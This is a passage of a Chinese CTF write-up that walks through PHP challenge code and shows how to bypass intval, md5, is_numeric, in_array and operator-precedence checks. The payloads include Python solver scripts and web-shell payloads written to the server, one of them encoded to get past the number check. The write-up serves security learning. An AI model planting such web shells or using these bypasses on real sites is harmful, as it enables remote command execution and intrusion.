<li><p><code>intval($num,0)</code> ：当参数二为 <code>0</code> 时，表示根据字符串格式自动选择合适的进制来完成转换。</p>
</li>
<li><p>构造 Payload ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?num=0x117C</span><br><span class="line">?num=010574   （0开头是八进制）</span><br><span class="line">?num=+4476</span><br><span class="line">?num=4476+1-1</span><br><span class="line">?num=4476.1</span><br><span class="line">?num=4476e1  （科学计数法）</span><br><span class="line">?num=4476&#x27;  （开头为数字时会把开头的数字部分转换为数字，其他忽略）</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="题目三变体一"><a href="#题目三变体一" class="headerlink" title="题目三变体一"></a>题目三变体一</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解题思路</strong></p>
<p><code>==</code> 两边分别为字符串与数字时，会将字符串转换为数字再比较。<strong>转换过程没搞懂，暂时问不清楚！</strong></p>
<p>请看 Payload ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?num=0x117C</span><br><span class="line">?num=010574</span><br><span class="line">?num=4476.1</span><br><span class="line">?num=4476e1</span><br></pre></td></tr></table></figure>



<h3 id="题目三变体二"><a href="#题目三变体二" class="headerlink" title="题目三变体二"></a>题目三变体二</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解题思路</strong></p>
<p>又过滤了字母，还好前面总结的 Payload 够多。</p>
<p>请看 Payload ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num=010574</span><br><span class="line">?num=4476.1</span><br></pre></td></tr></table></figure>



<h3 id="题目三变体三"><a href="#题目三变体三" class="headerlink" title="题目三变体三"></a>题目三变体三</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>解题思路</strong></p>
<p>放宽了等于的条件，又加了一个条件，<code>strpos()</code> 返回某字符首次出现的位置，所以必须有 <code>0</code> 且 <code>0</code> 不能出现在首位。</p>
<p>请看 Payload ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num=%20010574   （加了一个空格的八进制数值，核心是加符号还有0）</span><br><span class="line">?num=4476.0</span><br><span class="line">?num=4476+0</span><br></pre></td></tr></table></figure>



<h2 id="题目四"><a href="#题目四" class="headerlink" title="题目四"></a>题目四</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Payload ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=./flag.php</span><br></pre></td></tr></table></figure>



<h2 id="题目五"><a href="#题目五" class="headerlink" title="题目五"></a>题目五</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>解题思路</strong></p>
<p><code>md5()</code> 函数传入非字符串类型参数时会返回 <code>false</code> ，此处可传入两个数组使 <code>md5()</code> 函数返回 <code>false</code> ，于是 <code>false === false</code> 绕过 MD5 校验成功。</p>
<p>Payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;a[]&quot;:1,&quot;b[]&quot;:2&#125;  # requests 脚本 data 参数</span><br></pre></td></tr></table></figure>



<h2 id="题目六"><a href="#题目六" class="headerlink" title="题目六"></a>题目六</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>解题思路</strong></p>
<p>本题有四个三元运算符：</p>
<p>第一个判断是否定义了 <code>$_GET</code> 数组，若定义了，用 <code>$_POST</code> 数组给 <code>$_GET</code> 数组<strong>引用赋值</strong>（ <code>=&amp;</code> ）；若未定义，返回字符串 <code>flag</code> （不会返回到哪里去，后面也是）。</p>
<p>引用赋值 <code>=&amp;</code> ，类似指针，让 <code>$_GET</code> 和 <code>$_POST</code> 指向同一个数据，之后对 <code>$_GET</code> 的操作会直接影响 <code>$_POST</code>，反之亦然。</p>
<p>第二个判断 <code>$_GET</code> 数组里的 <code>$_GET[&#39;flag&#39;]</code> 元素的值是否等于 <code>flag</code> ，结合前面的引用赋值，就是判断 <code>$_POST[flag]</code> 元素的值是否等于 <code>flag</code> 。如果等于，则用 <code>$_COOKIE</code> 数组给 <code>$_GET</code> 数组引用赋值。</p>
<p>第三个与第二个同理，不过最后会用 <code>$_SERVER</code> 数组给 <code>$_GET</code> 数组引用赋值。</p>
<p>第四个判断 <code>$_SERVER</code> 数组中的 <code>$_SERVER[&#39;HTTP_FLAG&#39;]</code> 元素的值是否等于 <code>flag</code> 。如果等于则会将 <code>$flag</code> 变量作为文件名语法高亮（其实就是找不到该文件时会报错，把 <code>$flag</code> 变量的值回显在前端）。</p>
<p>所以构造 URL 、请求体、 Cookie 与请求头字段即可得到 flag 。</p>
<p><strong>Python 脚本解法</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;目标URL&quot;</span></span><br><span class="line">params = &#123; <span class="string">&quot;a&quot;</span>: <span class="string">&quot;1&quot;</span> &#125;  <span class="comment"># URL 传参</span></span><br><span class="line">data = &#123; <span class="string">&quot;flag&quot;</span>: <span class="string">&quot;flag&quot;</span> &#125;  <span class="comment"># POST 数据</span></span><br><span class="line">cookies = &#123; <span class="string">&quot;flag&quot;</span>: <span class="string">&quot;flag&quot;</span> &#125;  <span class="comment"># Cookie</span></span><br><span class="line">headers = &#123; <span class="string">&quot;FLAG&quot;</span>: <span class="string">&quot;flag&quot;</span> &#125;  <span class="comment"># 设置 HTTP 头</span></span><br><span class="line"></span><br><span class="line">response = requests.post( url, params=params, headers=headers, cookies=cookies, data=data )</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p><strong><code>headers = &#123; &quot;FLAG&quot;: &quot;flag&quot; &#125;</code> 的键名为什么不是 <code>HTTP_FLAG</code> 而是 <code>FLAG</code></strong> ：PHP 会把请求头的所有字段转化为大写并加上前缀 <code>HTTP_</code> 再写入 <code>$_SERVER</code> 数组，每个字段都对应一个元素。<code>$_SERVER</code> 数组的详细介绍可查看我写的关于 <code>$_SERVER</code> 数组的介绍。</p>
<h2 id="题目七"><a href="#题目七" class="headerlink" title="题目七"></a>题目七</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>解题思路</strong></p>
<p>随机生成 1 到 0x36d 也就是 877 的数字，并添加到 <code>$allow[]</code> 数组中。随后比对数组元素 <code>$_GET[&#39;n&#39;]</code> 的值是否在数组 <code>$allow[]</code> 中，并以 <code>$_GET[&#39;n&#39;]</code> 的值为文件名，将 <code>$_POST[&#39;content&#39;]</code> 写入文件。</p>
<p>此处的 <code>in_array()</code> 不是严格模式，会转换，根据 PHP 特性，开头为数字的字符串被转化为数字时，后面的字符串会被去掉，所以可以构造 Payload ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">params = &#123;&quot;n&quot;:&quot;10.php&quot;&#125;  # 那么多次随机数总该生成 10 吧</span><br><span class="line">data = &#123;&quot;content&quot;:&quot;&lt;?php system(&#x27;ls&#x27;);&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>通过文件名 <code>10.php</code> 来使该文件被访问时会被当成 PHP 文件处理，从而执行恶意代码。</p>
<h2 id="题目八"><a href="#题目八" class="headerlink" title="题目八"></a>题目八</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># php7.3</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>解题思路</strong></p>
<p><strong>逻辑运算符 <code>and</code> 的优先级没有 <code>&amp;&amp;</code> 高</strong>，像 <code>$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</code> 这样写会导致 <code>$v0</code> 先被赋值，再进行后面的与运算（单纯的表达式，没有返回结果给任何变量）。</p>
<p>所以 <code>$v2</code> 和 <code>$v3</code> 不用是数字，可以把 <code>$v2</code> 作为要执行的语句，给 <code>$v3</code> 赋值为 <code>;</code> 通过第二层条件判断。</p>
<p>Payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=1&amp;v2=var_dump($ctfshow)&amp;v3=;</span><br></pre></td></tr></table></figure>

<p> <code>$v2</code> 后面的 <code>(&#39;ctfshow&#39;)$v3&quot;)</code> 会直接报错，但 <code>var_dump()</code> 正常执行。</p>
<p>最后得到的 flag 故意没加 <code>-</code> ，需要自己把 <code>0x2d</code> 转换成 <code>-</code> 。</p>
<h2 id="题目九"><a href="#题目九" class="headerlink" title="题目九"></a>题目九</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># php7.3</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>php7.3</p>
<p><strong>解题思路</strong></p>
<p>与之前相同，<code>and</code> 优先级更低，所以只需满足 <code>$v2</code> 是数字。</p>
<p>此外， <code>$v2</code> 的前两位会被切割掉，所以前两位要补位。</p>
<p>然后用 <code>call_user_func()</code> 函数调用名称为变量 <code>$v1</code> 的值的函数，参数为被切割后的 <code>$v2</code> 。</p>
<p>最后将用户调用函数返回的结果写入文件，文件名为 <code>$v3</code> 的值。</p>
<p>如果是 php5 版本，这道题会容易很多，因为数字后出现的字母会被直接忽略，只要字符串开头是数字，整个字符串就会被识别为数字。但是到了本题的 php7.3 ，哪怕是十六进制数也不会被判定为数字（我尝试用十六进制与 <code>hex2bin()</code> 函数绕过，已失败），只能取巧解题。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`$_POST[0]`;</span><br><span class="line">PD89YCRfUE9TVFswXWA7</span><br><span class="line">5044383959435266554539545646737758574137</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`cat *`;</span><br><span class="line">PD89YGNhdCAqYDs=</span><br><span class="line">5044383959474e68644341715944733d  # 删去最后两位</span><br></pre></td></tr></table></figure>

<p>第一个 Payload 的 Base64 编码的高四位与低四位转化为十六进制在 0 到 9 范围内，不会出现字母，可完美绕过 <code>is_numeric()</code> 函数。</p>
<p>第二个 Payload 删去最后两位后（影响不大），只有数字和字母 <code>e</code> ，被当成科学计数法从而实现绕过。</p>
<p><strong>Python 脚本解法</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;目标URL&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;v1&quot;</span>:<span class="string">&quot;hex2bin&quot;</span>&#125;</span><br><span class="line">params = &#123;<span class="string">&quot;v2&quot;</span>:<span class="string">&quot;随便两位补位数字+十六进制的Payload&quot;</span>,<span class="string">&quot;v3&quot;</span>:<span class="string">&quot;php://filter/write=convert.base64-decode/resource=shell.php&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url,params=params,data=data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p>第一个 Payload 需要用 POST 方法发送要执行的命令，但功能完整；第二个只能查看网站根目录已有的文件的内容。</p>
<h2 id="题目十"><a href="#题目十" class="headerlink" title="题目十"></a>题目十</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span 